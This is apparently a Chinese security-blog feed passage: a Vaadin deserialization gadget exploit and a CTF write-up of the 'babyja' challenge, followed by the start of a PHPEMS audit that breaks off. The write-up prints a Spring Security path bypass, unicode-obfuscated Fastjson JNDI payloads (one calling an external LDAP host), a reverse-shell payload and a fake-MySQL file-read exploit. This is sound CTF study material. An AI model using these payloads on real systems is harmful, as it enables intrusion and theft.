class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Vaadin_Ser</span> &#123;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span>  <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object</span><br><span class="hljs-params">            value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">// 生成包含恶意类字节码的 TemplatesImpl 类</span><br>        <span class="hljs-type">byte</span>[] payloads = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Security-Testing\\Java-Sec\\Java-Sec-Payload\\target\\classes\\Evail_Class\\Calc_Ab.class&quot;</span>));<br><br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;payloads&#125;);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;zjacky&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">PropertysetItem</span> <span class="hljs-variable">pItem</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PropertysetItem</span>();<br><br>        NestedMethodProperty&lt;Object&gt; nmprop = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NestedMethodProperty</span>&lt;Object&gt;(templates, <span class="hljs-string">&quot;outputProperties&quot;</span>);<br>        pItem.addItemProperty(<span class="hljs-string">&quot;outputProperties&quot;</span>, nmprop);<br><br>        <span class="hljs-comment">// 实例化 BadAttributeValueExpException 并反射写入</span><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">exception</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-string">&quot;zjacky&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span>     <span class="hljs-operator">=</span> BadAttributeValueExpException.class.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(exception, pItem);<br><br><span class="hljs-comment">//        serialize(exception);</span><br>unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334065.png" alt="image">​</p><p>‍</p><p>整个链代码量非常少，其实还是很简单的自己动手跟下即可非常容易理解</p><p>‍</p><h1 id="CTFer"><a href="#CTFer" class="headerlink" title="CTFer"></a>CTFer</h1><p>这里学完这个之后来以2023年福建省赛黑盾杯的初赛babyja来进行案例分析，考点如下(其实这个题很多解法)</p><ol><li>Fastjson 黑名单绕过 or 不出网应用</li><li>Spring Security 权限绕过</li><li>Vaadin反序列化链</li><li>C3P0二次反序列化</li></ol><p>‍</p><h2 id="2023闽盾杯初赛-babyja"><a href="#2023闽盾杯初赛-babyja" class="headerlink" title="2023闽盾杯初赛 babyja"></a>2023闽盾杯初赛 babyja</h2><p>目录结构</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334238.png" alt="image">​</p><p>查看<code>pom.xml</code>​</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334393.png" alt="image">​</p><p>其实意图就很明显三个组件都能相互配合(马后炮)</p><p>‍</p><p>并且存在Spring Security的一个权限鉴权，先查看下<code>AuthConfig.class</code>​ 发现是用<code>regexMatchers</code>​来进行正则匹配路径，去查看下spring Security的版本为 5.6.3 ，而这里由于设计问题看他的控制器是随便什么都可以进入逻辑 相当于<code>admin/*</code>​ ，所以完全符合漏洞版本所以可以使用<code>%0d</code>​绕过</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334573.png" alt="image">​</p><p>直接访问302</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334767.png" alt="image">​</p><p>权限绕过后返回​<code>WellDone</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334935.png" alt="image">​</p><p>当然给出账号密码也是可以登录获取Session的</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334084.png" alt="image">​</p><p>获取到Session <code>JSESSIONID=FC8D9FE4BBDAE0BC554377DB1CAFCBE8</code>​</p><p>发现成功执行</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334270.png" alt="image">​</p><p>‍</p><p>再来查看控制器</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334427.png" alt="image">​</p><p>可以发现传入data这个json字符串然后进行鉴权并且给到<code>JSON.parse</code>​解析，其实可以想到绕过黑名单+fastjson打C3p0不出网这个思路，也可以直接打jndi注入吧，跟进<code>SecurityCheck</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334831.png" alt="image">​</p><p>可以想到用16进制或者unicode来进行绕过黑名单，所以有以下打法</p><p>‍</p><h3 id="JNDI注入-出网-jdk低版本"><a href="#JNDI注入-出网-jdk低版本" class="headerlink" title="JNDI注入(出网+jdk低版本)"></a>JNDI注入(出网+jdk低版本)</h3><p>本地用的是jdk8u65</p><p>‍</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">POST</span> <span class="hljs-string">/admin/user%0d</span> <span class="hljs-string">HTTP/1.1</span><br><span class="hljs-attr">Host:</span> <span class="hljs-string">localhost:8080</span><br><span class="hljs-attr">Accept:</span> <span class="hljs-string">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="hljs-attr">Accept-Encoding:</span> <span class="hljs-string">gzip,</span> <span class="hljs-string">deflate,</span> <span class="hljs-string">br</span><br><span class="hljs-attr">Accept-Language:</span> <span class="hljs-string">zh-CN,zh;q=0.9</span><br><span class="hljs-attr">Content-Length:</span> <span class="hljs-number">0</span><br><span class="hljs-attr">Content-Type:</span> <span class="hljs-string">application/x-www-form-urlencoded</span><br><span class="hljs-attr">Sec-Fetch-Dest:</span> <span class="hljs-string">document</span><br><span class="hljs-attr">Sec-Fetch-Mode:</span> <span class="hljs-string">navigate</span><br><span class="hljs-attr">Sec-Fetch-Site:</span> <span class="hljs-string">none</span><br><span class="hljs-attr">Sec-Fetch-User:</span> <span class="hljs-string">?1</span><br><span class="hljs-attr">Upgrade-Insecure-Requests:</span> <span class="hljs-number">1</span><br><span class="hljs-attr">User-Agent:</span> <span class="hljs-string">Mozilla/5.0</span> <span class="hljs-string">(Windows</span> <span class="hljs-string">NT</span> <span class="hljs-number">10.0</span><span class="hljs-string">;</span> <span class="hljs-string">Win64;</span> <span class="hljs-string">x64)</span> <span class="hljs-string">AppleWebKit/537.36</span> <span class="hljs-string">(KHTML,</span> <span class="hljs-string">like</span> <span class="hljs-string">Gecko)</span> <span class="hljs-string">Chrome/83.0.4103.116</span> <span class="hljs-string">Safari/537.36</span><br><span class="hljs-attr">sec-ch-ua:</span> <span class="hljs-string">&quot;Not A(Brand&quot;</span><span class="hljs-string">;v=&quot;99&quot;,</span> <span class="hljs-string">&quot;Google Chrome&quot;</span><span class="hljs-string">;v=&quot;121&quot;,</span> <span class="hljs-string">&quot;Chromium&quot;</span><span class="hljs-string">;v=&quot;121&quot;</span><br><span class="hljs-attr">sec-ch-ua-mobile:</span> <span class="hljs-string">?0</span><br><span class="hljs-attr">sec-ch-ua-platform:</span> <span class="hljs-string">&quot;Windows&quot;</span><br><br><span class="hljs-string">data=&#123;&#123;urlenc(eyJAdHlwZSI6Ilx1MDA2M1x1MDA2Zlx1MDA2ZFx1MDAyZVx1MDA3M1x1MDA3NVx1MDA2ZVx1MDAyZVx1MDA3Mlx1MDA2Zlx1MDA3N1x1MDA3M1x1MDA2NVx1MDA3NFx1MDAyZVx1MDA0YVx1MDA2NFx1MDA2Mlx1MDA2M1x1MDA1Mlx1MDA2Zlx1MDA3N1x1MDA1M1x1MDA2NVx1MDA3NFx1MDA0OVx1MDA2ZFx1MDA3MFx1MDA2YyIsImRhdGFTb3VyY2VOYW1lIjoibGRhcDovLzEwNy4xNzQuMjI4Ljc5OjEzODkvQmFzaWMvQ29tbWFuZC9jYWxjIiwiYXV0b0NvbW1pdCI6dHJ1ZX0=)&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>‍</p><p>直接反弹shell即可</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://xxx:1389/Basic/ReverseShell/xxx/7979&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334979.png" alt="image">​</p><p>‍</p><p>当然除了直接打1.2.24的JNDI 也可以打C3P0的JNDI,只是需要用unicode或者16进制去绕过即可</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml">&#123;<span class="hljs-string">&quot;@type&quot;</span><span class="hljs-string">:&quot;com.mchange.v2.c3p0.\u004a\u006e\u0064\u0069\u0052\u0065\u0066\u0043\u006f\u006e\u006e\u0065\u0063\u0074\u0069\u006f\u006e\u0050\u006f\u006f\u006c\u0044\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065&quot;</span>,<span class="hljs-string">&quot;\u004a\u006e\u0064\u0069\u004e\u0061\u006d\u0065&quot;</span><span class="hljs-string">:&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>, <span class="hljs-string">&quot;LoginTimeout&quot;</span><span class="hljs-string">:0</span>&#125;<br></code></pre></td></tr></table></figure><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334141.png" alt="image">​</p><h3 id="不出网打二次反序列化"><a href="#不出网打二次反序列化" class="headerlink" title="不出网打二次反序列化"></a>不出网打二次反序列化</h3><p>C3P0打二次反序列化, 可以看到该题存在Vaadin的依赖，所以可以通过C3P0打Vaadin的反序列化，但是由于他把<code>TemplatesImpl</code>​的16进制也给ban了，这样子我们就没办法用C3P0打二次反序列化来使用<code>TemplatesImpl</code>​加载字节码了</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334306.png" alt="image">​</p><p>所以只能另从别的思路来看，从始至终我们并没有去讨论题目的<code>bean</code>​目录，现在来看下</p><p>一个接口</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334525.png" alt="image">​</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334680.png" alt="image">​</p><p>可以发现这里存在<code>getConnection</code>​方法，而在Vaadin分析中可以得知，其链子一部分是可以调用任意属性的getter方法的，所以在这里思路就是：调用<code>getConnection</code>​方法来控制JDBC来连恶意的mysql从而读取flag，而已的mysql为</p><p><a href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></p><p>‍</p><p>根据Vaadin的exp来修改下即可，最后的exp(这里参考大头Sec的Wp)为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.ctf.bean.MyBean;<br><span class="hljs-keyword">import</span> com.vaadin.data.util.NestedMethodProperty;<br><span class="hljs-keyword">import</span> com.vaadin.data.util.PropertysetItem;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Vaadin_Ser</span> &#123;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span>  <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object</span><br><span class="hljs-params">            value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] ser(Object obj) <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(bos);<br>        out.writeObject(obj);<br>        out.flush();<br>        <span class="hljs-keyword">return</span> bos.toByteArray();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">bytesToHexString</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bArray)</span> &#123;<br>        <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>(bArray.length);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span> b : bArray) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">sTemp</span> <span class="hljs-operator">=</span> Integer.toHexString(<span class="hljs-number">255</span> &amp; b);<br>            <span class="hljs-keyword">if</span> (sTemp.length() &lt; <span class="hljs-number">2</span>) &#123;<br>                sb.append(<span class="hljs-number">0</span>);<br>            &#125;<br>            sb.append(sTemp.toUpperCase());<br>        &#125;<br>        <span class="hljs-keyword">return</span> sb.toString();<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">MyBean</span> <span class="hljs-variable">myBean</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">MyBean</span>();<br>        myBean.setDatabase(<span class="hljs-string">&quot;mysql://xxx:3306/test?user=fileread_file:///flag.txt&amp;ALLOWLOADLOCALINFILE=true&amp;maxAllowedPacket=65536&amp;allowUrlInLocalInfile=true#&quot;</span>);<br><br>        <span class="hljs-type">PropertysetItem</span> <span class="hljs-variable">pItem</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PropertysetItem</span>();<br><br>        NestedMethodProperty&lt;Object&gt; nmprop = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NestedMethodProperty</span>&lt;Object&gt;(myBean, <span class="hljs-string">&quot;Connection&quot;</span>);<br>        pItem.addItemProperty(<span class="hljs-string">&quot;Connection&quot;</span>, nmprop);<br><br>        <span class="hljs-comment">// 实例化 BadAttributeValueExpException 并反射写入</span><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">exception</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-string">&quot;zjacky&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span>     <span class="hljs-operator">=</span> BadAttributeValueExpException.class.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(exception, pItem);<br><br>        <span class="hljs-comment">// 序列化并输出 HEX 序列化结果</span><br>        System.out.println(bytesToHexString(ser(exception)));<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里有一个很重要的东西，就是包名一定要得对(CTFer的痛)</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334863.png" alt="image">​</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">mysql:<span class="hljs-comment">//1.1.1.1:3306/test?user=fileread_file:///.&amp;ALLOWLOADLOCALINFILE=true&amp;maxAllowedPacket=65536&amp;allowUrlInLocalInfile=true#</span><br><br>mysql:<span class="hljs-comment">//1.1.1.1:3306/test?user=fileread_file:///flag.txt&amp;ALLOWLOADLOCALINFILE=true&amp;maxAllowedPacket=65536&amp;allowUrlInLocalInfile=true#</span><br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334081.png" alt="image">​</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>代码审计 - PHP - 再谈西湖论剑PHPEMS</title>
    <link href="/post/code-audit-php-let-s-talk-about-the-west-lake-discussion-sword-phpems-29qhni.html"/>
    <url>/post/code-audit-php-let-s-talk-about-the-west-lake-discussion-sword-phpems-29qhni.html</url>
    
    <content type="html"><![CDATA[<p>‍</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是2024西湖论剑的一道1解题由EDI安全的大牛子全场唯一解出，当时还没仔细看的时候信心满满，觉得小小PHP真随便审吧，结果又被现实给打爆了，这个CMS整体算是审了快五个小时了，真正的学习完后真的很佩服出了这个题的师傅以及挖出该CVE的师傅，确实真的很强，学到了沃日</p><p>‍</p><h1 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h1><p>flag2，登录管理员后台，看用户列表就有了。这里是 flag2 提交处，flag格式为 DASCTF2{***}, 只提交括号内的字符串。PHPEMS源码下载分流：链接：<a href="https://pan.baidu.com/s/1qK5ox8s4zknefQGsxSWy2g?pwd=DASC%E6%8F%90%E5%8F%96%E7%A0%81%EF%BC%9ADASC--%E6%9D%A5%E8%87%AA%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E8%B6%85%E7%BA%A7%E4%BC%9A%E5%91%98V5%E7%9A%84%E5%88%86%E4%BA%AB">https://pan.baidu.com/s/1qK5ox8s4zknefQGsxSWy2g?pwd=DASC提取码：DASC--来自百度网盘超级会员V5的分享</a></p><p>hint1: 1. 管理员账号在靶机里已经改过了，教师账号也删了，不要刻舟求剑，自己想其他办法吧，谢谢。</p><pre><code class="hljs">  2. CVE-2023-6654</code></pre><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402041803384.png" alt="image">​</p><p>‍</p><h1 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h1><h2 id="路由分析"><a href="#路由分析" class="headerlink" title="路由分析"></a>路由分析</h2><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402041803738.png" alt="09a1db789f39fc100181d5f2817fff1">​</p><p>‍</p><p>直接看如何加载类的</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402041803897.png" alt="image">​</p><p>先引入几个模块和配置</p><p><code>/lib/config.inc.php</code>​(配置)</p><p><code>/vendor/vendor/autoload.php</code>​(项目没有 删掉了)</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402041803117.png" alt="image">​</p><p>‍</p><p>然后调用<code>run()</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402041803287.png" alt="image">​</p><p>跟进<code>make</code>​方法</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402041803444.png" alt="image">​</p><p>所以<code>make</code>​方法就是加载参数.cls.php这个类，并且进行初始化(调用<code>_init()</code>​)，传入<code>ev</code>​这个类后还默认初始化了<code>strings</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402041803898.png" alt="image">​</p><p>往下就是传参进行具体的控制器的映射了</p><p>‍</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>‍</p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>直接跟index.php的流程可以发现他在没有Cookie的情况下会进行设置sessionid</p><p>先看栈堆</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">session.cls.php:163, PHPEMS\session-&gt;setSessionUser()<br>session.cls.php:85, PHPEMS\session-&gt;getSessionId()<br>session.cls.php:18, PHPEMS\session-&gt;__construct()<br>init.cls.php:54, PHPEMS\ginkgo::make()<br>app.php:13, PHPEMS\app-&gt;__construct()<br>init.cls.php:109, PHPEMS\ginkgo-&gt;run()<br>index.php:8, &#123;main&#125;()<br></code></pre></td></tr></table></figure><p>其实就是默认会有一个加解密Cookie的流程，这个session类是专门处理cookie的，他每次在实例化的时候都会运行到getSessionId</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402041803073.png" alt="image">​</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402041803214.png" alt="image">​</p><p>可以发现他是传了<code>getClientIp()</code>​方法作为数组的某个键值对作为参数的，看下<code>getClientIp</code>​方法</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402041803369.png" alt="image">​</p><p>可控</p><p>‍</p><p>接下来再去看<code>setSessionUser</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402041803509.png" alt="image">​</p><p>其实看下来发现就sessionip可控吧</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402041803651.png" alt="image">​</p><p>‍</p><p>但是这里有一个<code>$key = CS;</code>​密钥加解密，可以找到在配置文件中找到硬编码的key</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402041803808.png" alt="image">​</p><p>然后尝试通过该硬编码尝试对Cookie进行解密</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402041803949.png" alt="image">​</p><p>此时我们在来看看encode和decode规律</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402041803096.png" alt="image">​</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 